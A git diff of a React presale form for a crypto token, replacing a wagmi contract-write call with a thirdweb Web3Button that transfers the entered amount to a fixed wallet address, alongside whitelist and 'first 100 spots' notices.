@@ -1,18 +1,12 @@
 import './PresaleForm.css'
 
-import { usePrepareSendTransaction, useSendTransaction, useContractWrite, usePrepareContractWrite } from 'wagmi';
-import { parseEther } from 'viem';
+import { Web3Button } from '@thirdweb-dev/react';
 
 import { useState } from 'react';
-import { useDebounce } from 'use-debounce';
-
-import soonABI from './ERC20ABI.json';
 
 const PresaleForm = () => {
   const [amount, setAmount] = useState('1');
   const [soonAmount, setSoonAmount] = useState();
-
-  const [debouncedAmount] = useDebounce(amount, 500);
 
   // const {config} = usePrepareSendTransaction({
   //   to: '0x7Ad696FC88B9Cc87c138859F0623872feFa08F56',
@@ -22,17 +16,17 @@ const PresaleForm = () => {
 
   // const {sendTransaction} = useSendTransaction(config);
 
-  const {config} = usePrepareContractWrite({
-    address: '0x7Ad696FC88B9Cc87c138859F0623872feFa08F56',
-    abi: soonABI,
-    functionName: 'transfer',
-    args: ['0xbe73A108d4F808cE47441E12A81A86b95880c4F5', BigInt(1.00211 * 10 ** 18)],
-    onError(error) {
-      console.log('Error', error);
-    }
-  })
+  // const {config} = usePrepareContractWrite({
+  //   address: '0x7Ad696FC88B9Cc87c138859F0623872feFa08F56',
+  //   abi: soonABI,
+  //   functionName: 'transfer',
+  //   args: ['0xbe73A108d4F808cE47441E12A81A86b95880c4F5', BigInt(1.00211 * 10 ** 18)],
+  //   onError(error) {
+  //     console.log('Error', error);
+  //   }
+  // })
 
-  const {write} = useContractWrite(config);
+  // const {write} = useContractWrite(config);
 
   const handleInput = (e) => {
     setAmount(e.target.value);
@@ -47,7 +41,7 @@ const PresaleForm = () => {
       return;
     }
 
-    write?.()
+    // write?.()
     // sendTransaction?.()
     console.log(amount);
   }
@@ -84,7 +78,18 @@ const PresaleForm = () => {
         <p className='presaleform__p-bold'>**Must make request ticket for Hawaii Whitelist**</p>
         <p className='presaleform__p-bold'>LIMITED TO FIRST 100 SPOTS</p>
       </div>
-      <button type='submit' className='presaleform__buynowbtn'>Buy Now</button>
+      {/* <button type='submit' className='presaleform__buynowbtn'>Buy Now</button> */}
+      <Web3Button
+      contractAddress='0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'
+      action={async (contract) => {
+        try {
+          await contract.call("transfer", ['0x7Ad696FC88B9Cc87c138859F0623872feFa08F56', amount * 1000000])
+        } catch (err) {
+          alert(err)
+        }
+        
+      }}
+      >Buy</Web3Button>
     </form>
   </div>;
 };
